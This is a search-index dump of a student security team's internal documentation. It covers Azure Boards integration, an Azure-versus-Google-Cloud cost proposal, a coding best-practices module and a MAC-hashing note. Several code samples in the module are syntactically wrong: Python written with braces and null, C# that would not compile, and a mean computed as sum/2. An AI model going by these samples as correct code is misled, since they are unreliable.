will be implemented and integrated into the existing infrastructure. This section will describe how the different components of Azure Boards interact with each other and how they integrate with the tools and systems currently in use by the various sub-teams. The goal is to create a cohesive, efficient, and scalable architecture that supports the cybersecurity objectives of the organization.    ","version":"Next","tagName":"h2"},{"title":"4.1 Overview of the Architecture​","type":1,"pageTitle":"Solution Architecture","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Solution Architecture#41-overview-of-the-architecture","content":" The architecture of the Azure Boards implementation is designed to provide a centralized platform for managing tasks, tracking progress, and facilitating collaboration across all sub-teams. Azure Boards will serve as the backbone of project management, ensuring that all teams can work cohesively while maintaining visibility into their specific responsibilities.  Each sub-team---SecDevOps, Blue Team, Infrastructure, Red Team, and GRC---will have dedicated area paths within Azure Boards, allowing them to manage their workflows independently while still being part of the larger organizational structure. The architecture is designed to be modular, enabling easy customization and scalability as the organization grows or as team requirements change.    ","version":"Next","tagName":"h3"},{"title":"4.2 Integration with Existing Tools​","type":1,"pageTitle":"Solution Architecture","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Solution Architecture#42-integration-with-existing-tools","content":" While Azure Boards will be the primary platform for task management, it will also be integrated with several key tools that are already in use at Redback Operations. These integrations will ensure seamless workflows and enhance the capabilities of Azure Boards.  4.2.1 GitHub Integration​  Azure Boards will be integrated with GitHub, allowing the SecDevOps and Red Teams to link work items with specific commits, branches, and pull requests. This integration will facilitate code reviews, track development progress, and ensure that all code changes are tied to specific tasks or user stories.  4.2.2 SonarQube Integration​  For the SecDevOps team, SonarQube can be integrated with Azure Boards to automate code quality inspections. This integration will allow security checks to be part of the continuous integration/continuous deployment (CI/CD) pipeline, with results being tracked as work items in Azure Boards.  4.2.3 Nagios Integration​  The Infrastructure team can use Nagios for system monitoring, with alerts and notifications being integrated into Azure Boards. This setup will ensure that any issues detected by Nagios are automatically logged as work items, allowing the team to respond quickly to system outages or performance degradation.  4.2.4 SIEM Tools Integration​  The Blue Team can integrate Azure Boards with Security Information and Event Management (SIEM) tools. This integration will ensure that security incidents detected by the SIEM tools are logged as work items in Azure Boards, allowing the Blue Team to manage and track the incident response process effectively.    ","version":"Next","tagName":"h3"},{"title":"4.3 Data Flow and Interaction​","type":1,"pageTitle":"Solution Architecture","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Solution Architecture#43-data-flow-and-interaction","content":" The data flow within the Azure Boards architecture is designed to be straightforward and efficient, ensuring that all teams can access the information they need while maintaining clear boundaries between different areas of responsibility.  4.3.1 Work Item Management​  All tasks, user stories, and other work items will be created, managed, and tracked within Azure Boards. Each work item will be associated with a specific area path, ensuring that it is visible only to the relevant team. Work items can be linked to specific commits, pull requests, or other external data sources as needed.  4.3.2 Boards and Sprints​  Each team will have its own board within Azure Boards, configured to reflect its specific workflow. Work items will move through the board as tasks progress, providing a visual representation of the team's work. Sprints will be used to manage work within specific timeframes, with burndown charts and other tools providing real-time insights into progress.  4.3.3 Notifications and Alerts​  Azure Boards will be configured to send notifications and alerts to team members based on specific triggers, such as the creation of a new work item, the movement of a task to a different stage, or the detection of a security incident. These notifications will ensure that team members are always aware of important developments.  4.3.4 Reporting and Dashboards​  Data from Azure Boards will be used to generate reports and dashboards that provide insights into team performance, project progress, and overall security posture. These reports can be customized to meet the needs of different stakeholders, ensuring that everyone has the information they need to make informed decisions.    ","version":"Next","tagName":"h3"},{"title":"4.4 Scalability and Flexibility​","type":1,"pageTitle":"Solution Architecture","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Solution Architecture#44-scalability-and-flexibility","content":" The architecture of the Azure Boards implementation is designed to be both scalable and flexible, allowing Redback Operations to adapt to changing requirements over time.  As the organization grows, new teams can be added to Azure Boards by creating additional area paths and configuring new boards. The architecture supports the addition of new work item types, workflows, and integrations as needed, ensuring that Azure Boards can continue to meet the organization's needs.  The modular design of the architecture also allows for easy customization of boards, workflows, and work item types. Teams can adjust their configurations based on evolving requirements, without affecting other teams or disrupting ongoing work.    ","version":"Next","tagName":"h3"},{"title":"4.5 Security Considerations​","type":1,"pageTitle":"Solution Architecture","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Solution Architecture#45-security-considerations","content":" Given the sensitive nature of the work carried out by the Cyber Security Team, security is a key consideration in the design of the Azure Boards architecture.  4.5.1 Access Control​  Access to Azure Boards will be tightly controlled, with permissions configured to ensure that team members can only view and interact with work items relevant to their responsibilities. This will be managed through role-based access control (RBAC), with different roles assigned based on team membership and job function.  4.5.2 Data Protection​  All data within Azure Boards will be protected by encryption, both at rest and in transit. Integration with other tools will be secured through encrypted communication channels, and sensitive information (such as credentials or personal data) will be handled in accordance with Redback Operations' data protection policies.  4.5.3 Audit and Compliance​  Azure Boards will be configured to provide audit logs that track all significant actions, such as the creation or modification of work items, changes to access permissions, and integration with external tools. These logs will be used to ensure compliance with internal and regulatory requirements.   ","version":"Next","tagName":"h3"},{"title":"Proposal for the utilization of Microsoft Azure as the cloud platform of choice for Redback Operations","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/azure/azure-proposal","content":"","keywords":"","version":"Next"},{"title":"Purpose and Scope of the Proposal​","type":1,"pageTitle":"Proposal for the utilization of Microsoft Azure as the cloud platform of choice for Redback Operations","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/azure/azure-proposal#purpose-and-scope-of-the-proposal","content":" The purpose of this proposal is to recommend the company to convert their choice of cloud operations and platform from Google Cloud to Microsoft Azure. The proposal will cover only Azure and Google Cloud and not consider any other cloud platforms.  ","version":"Next","tagName":"h2"},{"title":"What is Microsoft Azure?​","type":1,"pageTitle":"Proposal for the utilization of Microsoft Azure as the cloud platform of choice for Redback Operations","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/azure/azure-proposal#what-is-microsoft-azure","content":" Microsoft Azure is a cloud services platform provided by Microsoft, which allows organizations to utilize services in the cloud to carry out a variety of organizational activities from custom activities such as specific machines for software development and research to even leveraging identity and access management services for carrying out active directory operations, whether it be fully in the cloud or hybrid or even through private on-site options.  ","version":"Next","tagName":"h2"},{"title":"What is Google Cloud?​","type":1,"pageTitle":"Proposal for the utilization of Microsoft Azure as the cloud platform of choice for Redback Operations","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/azure/azure-proposal#what-is-google-cloud","content":" Google Cloud is a cloud service platform provided by Google, which operates on providing customer friendly prices while also giving a plethora of services from compute capabilities to administrative and security capabilities.  ","version":"Next","tagName":"h2"},{"title":"Azure Virtual Machines vs Google Compute Instances​","type":1,"pageTitle":"Proposal for the utilization of Microsoft Azure as the cloud platform of choice for Redback Operations","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/azure/azure-proposal#azure-virtual-machines-vs-google-compute-instances","content":" Both Azure and Google sport a large variety of predefined VMs for many operating systems, with their offerings categorized based on performance, machine specs and usage purpose, with billings being done on a pay-as-you-go basis. However Google Cloud does provide custom virtual machines (hardware specifics) to cater for extremely specific scenarios while maintaining very little pricing changes in comparison to Azure which lacks the flexibility  (https://cloud.google.com/compute/docs/instances/creating-instance-with-custom-machine-type).  ##Azure Cloud Regional Areas vs Google Cloud Zonal Areas Azure and Google Cloud each sport various datacenters across the globe, with atleast one datacenter in New South Wales and Victoria. These allow for creating geographic zones, which ensure that the instances created are in the closest physical location hosting the cloud capabilities in order to ensure low latency and little to no delays for the customer.  Backups of the instances may be spread across globally based on Azure and Google Cloud backup policies or stored completely in a different region. Offerings of available resources on the cloud will vary from region to region.  ","version":"Next","tagName":"h2"},{"title":"Azure Cloud Geographies​","type":1,"pageTitle":"Proposal for the utilization of Microsoft Azure as the cloud platform of choice for Redback Operations","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/azure/azure-proposal#azure-cloud-geographies","content":" https://azure.microsoft.com/en-gb/explore/global-infrastructure/geographies/#geographies    ","version":"Next","tagName":"h3"},{"title":"Google Cloud Locations​","type":1,"pageTitle":"Proposal for the utilization of Microsoft Azure as the cloud platform of choice for Redback Operations","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/azure/azure-proposal#google-cloud-locations","content":" https://cloud.google.com/about/locations#asia-pacific    Comparing Australian regions alongside regional offerings, the Sydney regions for both platforms offer the largest catalogue of products. Melbourne will be the recommended region as its offerings contain all the products required for Redback Operations.  ","version":"Next","tagName":"h3"},{"title":"Pricing of Azure and Google Cloud​","type":1,"pageTitle":"Proposal for the utilization of Microsoft Azure as the cloud platform of choice for Redback Operations","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/azure/azure-proposal#pricing-of-azure-and-google-cloud","content":" ","version":"Next","tagName":"h2"},{"title":"Pay-As-You-Go (PAYG)​","type":1,"pageTitle":"Proposal for the utilization of Microsoft Azure as the cloud platform of choice for Redback Operations","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/azure/azure-proposal#pay-as-you-go-payg","content":" Google Cloud was comparatively cheaper than Azure on almost all instance types. Azure generally offers a flat rate for PAYG billing, but Google Cloud utilizes a discount scaling method that increases the discount after a certain rate of usage, making Google Cloud an economical option for general purposes.    ","version":"Next","tagName":"h3"},{"title":"Reserved Instances/Committed Use​","type":1,"pageTitle":"Proposal for the utilization of Microsoft Azure as the cloud platform of choice for Redback Operations","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/azure/azure-proposal#reserved-instancescommitted-use","content":" Both platforms also offer alternatives called ‘Reserved Instances’ and ‘Committed Use’ by Azure and Google Cloud respectively. For long term or dedicated cloud usage, these alternatives are far cheaper since a fixed resource is set (regardless of how much of the resource is used, while allowing for consumption beyond the fixed resource), further ensuring that scaling lag or minute slowdowns/delays are not experienced. In these alternatives, Azure was cheaper across all instance types against Google Cloud.    ","version":"Next","tagName":"h3"},{"title":"Recommendation​","type":1,"pageTitle":"Proposal for the utilization of Microsoft Azure as the cloud platform of choice for Redback Operations","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/azure/azure-proposal#recommendation","content":" As seen in Trimester 3 2023, access for Google Cloud was vital for several projects, especially ones relying on data analytics and big data. While the projects were able to temporarily pivot and carry out their activities on local machines, the lack of Google Cloud access prevented projects from continuing (and possibly completing) activities planned in T2 2023. Deakin’s IT infrastructure together with identity management allowing for ease of access to Azure will make it easier for the company leadership responsible for access to grant it per project (via resource groups) to students.  ","version":"Next","tagName":"h2"},{"title":"Pros​","type":1,"pageTitle":"Proposal for the utilization of Microsoft Azure as the cloud platform of choice for Redback Operations","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/azure/azure-proposal#pros","content":" Students can simply sign in to Azure using their Deakin IDs in comparison to Google Cloud which requires students to create a google cloud (using the Deakin ID). Company board can own a tenant and split members into their relevant project user groups (assigned membership), which can then be assigned their very own resource groups to control resource creation and billing at a granular level. Since Deakin already owns the Deakin University tenant, it can be requested to create a specified group (or a separate tenant for Redback Operations if feasible) for the company with the company board having user administrator/group administrator permissions. Created resources (including instances with inbuilt software for projects) can be saved as templates for later use over trimesters.  ","version":"Next","tagName":"h3"},{"title":"Cons​","type":1,"pageTitle":"Proposal for the utilization of Microsoft Azure as the cloud platform of choice for Redback Operations","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/azure/azure-proposal#cons","content":" Due to the nature of the trimester activities and the companies, the Pay-As-You-Go model will have to be implemented over the Reserved Instances, in which Azure costs slightly more than Google Cloud (taking standard compute instances).  ","version":"Next","tagName":"h3"},{"title":"Rough Estimate of cost company will use​","type":1,"pageTitle":"Proposal for the utilization of Microsoft Azure as the cloud platform of choice for Redback Operations","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/azure/azure-proposal#rough-estimate-of-cost-company-will-use","content":" Assuming five instances (one per current project) with 100GB of persistent disk storage, we get an approximate cost of 1150 AUD per month on Google Cloud.    Assuming the same with Azure (alongside a 1-year discount plan of 20%), we get an approximate cost of 1204 AUD per month.    Despite the slight cost increase Azure will have over Google Cloud, the increase justifies the various efficiencies and ease of use the company will get from quick sign ins to access provisioning and resource control, which would make Azure a far more viable option than Google Cloud. ","version":"Next","tagName":"h3"},{"title":"Introduction","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Coding Best Practices/Introduction","content":"","keywords":"","version":"Next"},{"title":"Introduction to Module:​","type":1,"pageTitle":"Introduction","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Coding Best Practices/Introduction#introduction-to-module","content":" The following module will hopefully aim to inform the reader about a variety of concepts in the coding world ranging from code smells, best practice methods to reviewing our own code. All of these concepts will be supplied by coding examples in different coding languages and also opportunities to learn from the information supplied to then apply to future programs.  Throughout the module you will learn about Code Smells and what they are and how to refactor them to avoid the smells appearing in your programs. Coding best practices is also covered along with discussing what we can achieve when we put these into practice. After this the module then showcases a video in which we go through 2 examples of coding and what we need to be aware and look out for when conducting code reviews. Finally the last section of the module contains a quiz for individuals to compile the knowledge they have gained from the module into practical questions to test their understanding and finish the module feeling confident with what they have learnt.  ","version":"Next","tagName":"h2"},{"title":"Contents:​","type":1,"pageTitle":"Introduction","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Coding Best Practices/Introduction#contents","content":" The module is constructed with a number of sections including:  Introduction You are hereSection 1: CODE SMELLSSection 2: CODING BEST PRACTICESSection 3: CODE REVIEWINGSection 4: QUIZ ","version":"Next","tagName":"h3"},{"title":"Section 1 - Code Smells","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Coding Best Practices/Section1","content":"","keywords":"","version":"Next"},{"title":"BLOATERS:​","type":1,"pageTitle":"Section 1 - Code Smells","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Coding Best Practices/Section1#bloaters","content":" The first of the code smells categories falls under Bloaters: These are often referred to as Code, functions and classes that are so large that they become harder to work with. These can often accumulate over time as programs evolve. Within bloaters some causes of this smell arise from – Long methods, large classes, long parameter lists, Data clumps and Primitive obsession. (For our demonstration, we will focus on long methods, large classes and long parameter lists.)  //Example of what this can look like (Python) def large_function(data, parameter2, parameter3, parameter4, parameter5, parameter6) { if(data == null) { return 0 } calculate_average = sum(data)/2 print(calculate_average) data_min = min(data) data_max = max(data) range = data_max - data_min print(range) data_sum = sum(data) print(f&quot;Sum of data: {data_sum}&quot;) } dataset = [0, 1, 2, 3, 4, 5] large_function(dataset)   //How we can minimise bloaters (Python) def small_function(data) { if(data == null) { return 0 } average = sum(data)/2 print(average) } def range_function(data) { range = max(data)-min(data) print(range) } dataset = [0, 1, 2, 3, 4, 5] small_function(dataset) range_function(dataset)   ","version":"Next","tagName":"h2"},{"title":"CHANGE PREVENTERS:​","type":1,"pageTitle":"Section 1 - Code Smells","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Coding Best Practices/Section1#change-preventers","content":" This relates to changing something in one place but then we must make various changes across the code. This can further complicate our code and make it less readable and less consistent. Some causes of these Change Preventers include Divergent Change, Shotgun Surgery and Parallel Inheritance Hierarchy. (This code smell is not a main focus for this module although the provided resource will allow for further investigation into this particular smell) More can be explored via this link: https://refactoring.guru/refactoring/smells/change-preventers  ","version":"Next","tagName":"h3"},{"title":"DISPENSABLES:​","type":1,"pageTitle":"Section 1 - Code Smells","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Coding Best Practices/Section1#dispensables","content":" This can occur at any point throughout coding and this code smell relates to something that is unneeded in which when we refactor these, we can make the code become cleaner, efficient and easier to read. This smell can arise from many different factors in which we will go through in our examples. Dispensables is a very common code smell to occur in development. These involve Comments, duplicate code, data classes, dead code, lazy classes and speculative generality. (For our demonstration, we will focus on comments, duplicate code and dead code.)  //Some examples of dispensables (HTML) &lt;html&gt; &lt;body&gt; &lt;h1 id=&quot;title&quot;&gt; Hello World! &lt;/h1&gt; &lt;script&gt; function unused() //Dead code { console.log(&quot;Unused function&quot;); } function calculate(value) //Unneeded comments + Dead Code { if(value &lt; 0) //Checks if our value is less than 0 { return value * 6; //Multiplies value by 6 } else return value + 4; //Adds 4 to our value for everything else } function change('title') //Duplicate code { change.style.font = 'bold'; change.style.font = 'bold'; } const alignment = //Lazy element { Nothing:() =&gt; {} } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;   //How we can minimise dispensables (HTML) &lt;html&gt; &lt;body&gt; &lt;h1 id=&quot;title&quot;&gt; Hello World! &lt;/h1&gt; &lt;script&gt; function update-title('title') { change.style.font = 'bold'; } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;  ","version":"Next","tagName":"h2"},{"title":"Section 3 - Code Reviewing","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Coding Best Practices/Section3","content":"Last updated by: lach-harro, Last updated on: '17/05/2025' Last updated by: lach-harro, Last updated on: '17/05/2025' Section 3 - Code Reviewing This section looks into how we can manually review our own code to catch any potential errors before submisssion. ::: Info Author: Lachlan Harrison, 03/05/2025::: For this section, various pieces of coding will be presented with various points of interest that need to be reviewed to apply our best practices to: (This will be done in the Python coding standard for the purpose of this demonstration) We will then point out what needed to be refactored and why for the coding example as well as a refactored version of the code to demonstrate these coding best practices in action and why it is needed. Here is a link to the video in which you can watch to see the code reviewing process in action: VIDEO URL The ability to review your own work saves a lot of time for everyone as it is essentially like the first line of defence. You are trying to catch anything that you can see before it is then processed for another individual to also review. You may not always be able to find everything although, finding something is better than nothing. (Sometimes there may also just be genuinely nothing to find!)","keywords":"","version":"Next"},{"title":"Section 4 - Quiz","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Coding Best Practices/Section4","content":"Last updated by: lach-harro, Last updated on: '17/05/2025' Last updated by: lach-harro, Last updated on: '17/05/2025' Section 4 - Quiz This section contains a quiz to test your understanding of the module and review any components necessary. ::: Info Author: Lachlan Harrison, 03/05/2025::: To access the quiz for this module, a link will be provided. Test what you have learnt throughout the module and see how you go with the knowledge gathered from the module!Quiz Link: URL After completing the quiz you have successfully completed this module about Coding Best Practices, thank you for your time and hopefully you have learnt a few new skills to apply when developing future programs!","keywords":"","version":"Next"},{"title":"Adjusting MAC address anonymization for the MQTT Manager","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/adjusting-mac","content":"Last updated by: T_Apperley, Last updated on: '03/12/2024' Last updated by: T_Apperley, Last updated on: '03/12/2024' Adjusting MAC address anonymization for the MQTT Manager Proposed changes for MQTT info Author: Rinor Gimolli The code, using Python, aims to use data anonymization of client information – more specifically client names and client MAC addresses. The earlier code did this however, at a request, the idea was to scramble the MAC address into a alphanumeric ID – with the option to convert it back. Initial Code: Code After Changes This update hashes the MAC address using MD5, to the encode it in Base64, then it shortens it to 10 characters. This is used to create an alphanumeric ID. Due to these changes, 2 libraries need to be imported as shown below. import base64 import hashlib Although with these changes reversing to get the original MAC address still isn’t possible, it is still the most plausible method. For that to happen we would have to convert the hashes into encryption, which in itself is riskier","keywords":"","version":"Next"},{"title":"Section 2 - Coding Best Practices","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Coding Best Practices/Section2","content":"Last updated by: lach-harro, Last updated on: '17/05/2025' Last updated by: lach-harro, Last updated on: '17/05/2025' Section 2 - Coding Best Practices This section explains a variety of coding best practice methods that we can try and apply to our work to achieve a variety of goals. ::: Info Author: Lachlan Harrison, 03/05/2025::: On top of mitigating the code smells, we also need to ensure that we are also implementing some coding best practices to avoid security vulnerabilities and ensure that our code is appropriately utilized. Having these standards matter as it achieves numerous accomplishments including: Consistency: We can ensure uniformity across codebases which makes it easier for developers to read, understand and maintain our code. Applying the same concepts throughout our code effectively being concise. Readability: Having well-defined standards can reduce errors raised and improves collaboration within the team as everyone is able to easily read the code. Error Prevention: With consistent practices, we can catch some common mistakes early reducing the risk of bugs being existent and improving our coding quality. Scalability: Adhering to our best standards ensures our code can scale without becoming unmanageable. In other words, we can keep our performance in mind while coding and deliver a solution with good performance throughout the coding process. Cross-Team Collaboration: We can facilitate collaboration among developers especially in large teams. For example, Redback Operations being a large team and collaborating on various coding projects. Any member can look at your code, understand what is occurring and even contribute to the solution. Code Reviewing: An important aspect of this module, code reviews provide a clear criterion which can lead to effective feedback and refactoring of code in which we can then simplify our code. (This will be a dedicated section further in the module) Efficient Maintenance: Following our standards will simplify the debugging process within our coding alongside refactoring and maintenance tasks for our projects. Within this section of the module, we will briefly go through some various methods in which we can implement to our own coding to achieve the above accomplishments. 1. Choose Industry-specific coding standards:​ When utilizing coding standards, we can suit the needs of what we are developing. In other words, developing a video game may typically utilize C++ for example whereas HTML, CSS and JavaScript are typically utilized for Web Development. Understanding the requirements of our objectives assists us in determining what standards we should utilize. If we are constructing a visual representation of a dataset, R or even Python may be our solution to the development process. Although, keep in mind when selecting a language that some may have various security issues in which you also need to consider and be prepared to mitigate. For example, the C++ and C languages don’t have any bound checks in which buffer overflows may occur. Always make sure that the coding language and standards you are utilising are appropriate for the solution you are developing but always consider these security considerations as well. 2. Focus on Code readability:​ With code readability, there are various elements in which we can incorporate with our coding to improve the readability of the code in which can be very useful and simple to implement. These tactics involve: Writing as few lines as possible within our code, utilizing appropriate naming conventions, segment our blocks of code in the same section into paragraphs, utilizing indentation to mark the beginning and end of our control structures, not using lengthy functions as a single function should carry out a single task (this falls into the bloater code smell), using the DRY principle (Don’t Repeat Yourself), automate repetitive tasks whenever possible and avoiding long lines of code. Some examples of this include: //Hard to read code: (C#) public void hardToReadCode(num, start, end) { int mid=start+end/2; if num==null return null; else result = mid+num*2; return result; } //More readable code: (C#) public void easierToReadCode(num, start, end) { int mid = start+end/2; if num == null { return null; } else { result = mid+num*2; return result; } } With indentations in this example we are able to easier identify elements within a function. Readability is the key focus for this outcome! 3. Having meaningful names:​ We can utilize lots of different naming conventions within our coding and keep it consistent throughout a file. (As every file is different, some users may prefer one method to another.) We typically always stick to these naming conventions as it can achieve a variety of our outcomes listed above in particular readability and consistency. These naming conventions can be further elaborated into four main conventions: Camel Case: We start the name with a lowercase letter, if the name has multiple words, these words start with capital letters. This convention is typically utilized in JavaScript and even C# environments. public void findMaxValue(); Snake Case: We start the name with a lowercase letter, if the name has multiple words, these words start with a lowercase also and are separated with a ‘_’. This convention is typically utilized in Python environments. Int student_member_number = 42; Kebab Case: This is similar to the snake case except instead of using ‘_’ we utilise ‘-‘. This convention is typically utilized within HTML and CSS environments. get-user-input(); Pascal Case: Also known as Upper Camel Case, we start with a capital letter, if the name has multiple words, these all start with capital letters. This convention is typically utilized in C#, Python and JavaScript environments. int StudentMemberNumber = 42; To summarise, when selecting a naming convention, use it throughout the entirety of developing your code and try to minimise switching throughout the project. Consistency and Readability are key here! 4. Avoid the use of a single identifier for numerous purposes:​ Throughout our projects, we should always assign unique variable names to avoid any overlap! Especially minimise the use of global identifiers unless required as these can lead to confusion, unintended behaviour when running our programs and potential bugs within the project itself. This falls under efficient maintenance and error prevention especially if we can detect these issues early! //An example of a single identifier (C#) We want global to stay as 10: int global = 10; public void LocalIdentifier() { int local = global*2; global = 20; //We can easily change the global variable as it is a global variable hence the variable not needing to be initialised. } LocalIdentifier(); Console.WriteLine(global); //Prints 20 not 10 //An example of unique variable names (C#) We want global to stay as 10: public void LocalIdentifier() { int global = 10; int local = global*2; Console.WriteLine(global) } Console.WriteLine(LocalIdentifier()) //Prints 10 and not Local As we can observe in our example, the LocalIdentifier() function in our second example keeps the global variable within the function and won't change. Whereas in our first example, our global variable is a global variable in which can always be easily changed despite us wanting to keep it as one consistent variable. Consistency is the key outcome for this practice! 5. Add comments and prioritize documentation:​ It’s always wise to add comments to our code when writing it, there’s many benefits to doing so, but too much can make code messy and often relates back to our code smells in regards to dispensables but also our main accomplishments including readability, consistency and cross-team collaboration as comments can serve as documentation purposes also to inform other developers what is occurring, what needs to be done, etc. Here are some valid placements of when we should be adding comments versus when we should minimise it so that we don’t have too many dispensables occurring. Keeping in mind also that incorrect comments can mislead developers so we should always also be ensuring that we are accurate when writing a comment so that other developers can easily understand but also ourselves. WHEN TO ADD COMMENTS: When explaining intricate/non-obvious coding segmentsExplaining business rules, regulatory requirementsClarifying how the code handles edge cases/exceptionsDocumenting workarounds due to limitations or external dependenciesMarking areas of improvement WHEN NOT TO ADD COMMENTS: Redundant comments that repeat what the code already expressesIf the code’s purpose is evidentWe should remove temporary comments used for debugging once the issue has been resolved //An Example of comments in action: (REMOVE) will indicate to remove the line of comments: def function_work() { //TO WORK ON } variable = 42 //Assigns 42 to variable (REMOVE) - Codes purpose is evident dataset = [1,2,3,4,5] //Link to complete_function def complete_function() //Calculate the range of the dataset (REMOVE) - Codes purpose is evident { data_min = min(dataset) data_max = max(dataset) range = data_max-data_min return range } print(range) //Print the range of the dataset here once finished function (REMOVE) - Improvements have already been made so we can remove this 6. Have efficient data processing:​ When we code, we want to process data efficiently to achieve a result faster than something that may take longer due to incorrect coding/larger functions. This best practice method involves looking at dividing our code into smaller functions for reusability and maintainability which also achieves efficient maintenance should it be required. What this also means is that we need to be identifying any inefficient algorithms/data structures when conducting our code reviews and refactor them to create a more efficient solution. 7. Have effective code review and refactoring:​ We will explore this more in depth in a future section and after the remaining points of this section. Essentially, we are trying to follow consistent coding techniques, catching various points of improvement/error and refactoring to achieve these standards. We should always be double checking our work and attempting to discover any potential points of improvement or elements we may need to tweak to achieve these coding standards. After all, we all want our code to achieve an objective. Have we reviewed our code numerous times to make sure we achieve the various goals? 8. Try to formalise exception handling:​ The term ‘exception’ refers to any problem, issue or events that can occur when the code is running and may disrupt the flow of execution. This can ultimately terminate a program early or even pause it which we always are trying to avoid when coding. Exception handling is something that may not always be required (for example documentation pages) although when we are coding for something else (for example a video game) we always want to attempt to normalise exception handling. This can be achieved in several ways including ‘Try-Catch’ blocks for example in which is typically the most common way of exception handling as we can ‘Catch’ these exceptions and see what is going wrong with the code. Sometimes also when we need to consider what is going wrong with our code, this can also come down to slowness in which sometimes, patience is key although too much time consumed with nothing occurring can be a definite issue in which remediation is required to find issues and effectively have efficient maintenance. //Utilizing 'Try-Catch' (C#) try{ CallToFunction(element); Console.WriteLine(&quot;Test Passed!&quot;); } catch(ArgumentNullException) { Console.WriteLine(&quot;Exception caught&quot;); } 9. Have security and privacy considerations:​ With constant threats emerging, we want to mitigate any risk of any potential compromise. In saying this, having security considerations is of extreme importance and needs to always be implemented within our code. Some things we should not be doing at all, and this also comes with our code reviewing is: NO Hardcoded passwordsNO Hardcoded usernamesNO Sensitive data coded or listed These three main points are a definite ‘no-go’ within coding as these can be easily leveraged against us and can often lead to attacks against our systems and unauthorised access. After all, most cyber security incidents are often caused by human error, so mitigating this risk can drastically reduce the likelihood of a compromise leading to an incident. These also come from secure coding practices including studying and analysing the OWASP Top 10, MITRE ATT&amp;CK Framework, Cryptography Measures (Encryption/Decryption) and Security by design. Some resources will be provided for further information: OWASP Top 10: https://owasp.org/www-project-top-ten/MITRE: https://attack.mitre.org/ The main priority with this coding standard is that we should always be thinking about security considerations while completing our work, not have it as an afterthought. Always keep a tight security posture and always question to yourself, “Am I giving away any sensitive information in this file?” 10. Standardise headers for different files:​ With readability, we can create easier understandings amongst developers when the headers of different files align with a singular format. An example of this includes: File name, Date of Creation, Name of creator of the file and a summary of what it does. //Example File Name – 04/05/2025 - Student Name //Multiplies two numbers to give a new result. We can achieve this by some simple comments at the top of the file describing these various characteristics. By doing this, we also achieve cross-team collaboration as someone can open this file, read the top, and understand what is happening in the file rather than trying to decipher what the entirety of the file does. While yes, the developer may have left some comments throughout the file, having this header at the top of the file, makes it so much easier for users to quickly read and then decide if this is the file they are looking for or if they need to continue their search for something else. 11. Ensure there is daily backups/manual saving:​ This is a simple measure that we can implement although it still can sometimes slip through. Although we always wish that our systems can never crash, sometimes this can still happen, they can crash, data loss can occur, glitches, hardware damage. All of which can affect the progress of our work. We should save our code daily for large projects but even for smaller files, something as simple as ‘Ctrl+S’ (on Windows) to save our file always ensures we are keeping our progress so that if one of these unprecedented scenarios occur, we can be confident that when we return, we can pick up our work where we left it off without fear of losing what we have worked on. Autosave can be viable but don’t always rely on it also. Manual saving after all is the key to achieving this best practice method. Always remember to keep saving your work throughout the duration of modification, don't leave it until the end of your session to save and exit!!","keywords":"","version":"Next"},{"title":"Trivy Dependency Scan","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Dependency-Scanner","content":"","keywords":"","version":"Next"},{"title":"Overview​","type":1,"pageTitle":"Trivy Dependency Scan","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Dependency-Scanner#overview","content":" This GitHub Actions workflow automates the scanning of vulnerabilities in dependencies and files within a pull request (PR). The workflow uses Trivy, a vulnerability scanner, to scan both the entire repository and only the changed files in a PR. It then uses Reviewdog to post comments on the PR with the scan results, highlighting any vulnerabilities found.  The process consists of two jobs:  Trivy Repo Scan &amp; Upload to Security Tab: Checks the entire repository for vulnerable dependencies, ensuring that any new issues are identified and added to the Security section of the repository settings. Trivy PR Check: Scans only the files changed in the PR for vulnerabilities, using Reviewdog to post PR comments if high or critical vulnerabilities are detected.  ","version":"Next","tagName":"h2"},{"title":"Workflow Trigger​","type":1,"pageTitle":"Trivy Dependency Scan","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Dependency-Scanner#workflow-trigger","content":" The workflow is triggered on two events:  Push to main branch: The workflow will run when changes are pushed to the main branch. Pull Request (PR): The workflow will run when a pull request is opened or updated.  ","version":"Next","tagName":"h2"},{"title":"Jobs​","type":1,"pageTitle":"Trivy Dependency Scan","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/Dependency-Scanner#jobs","content":" ","version":"Next","tagName":"h2"},{"title":"1. Trivy Repo Scan & Upload to Security Tab​","type":1,"pageTitle":"Trivy 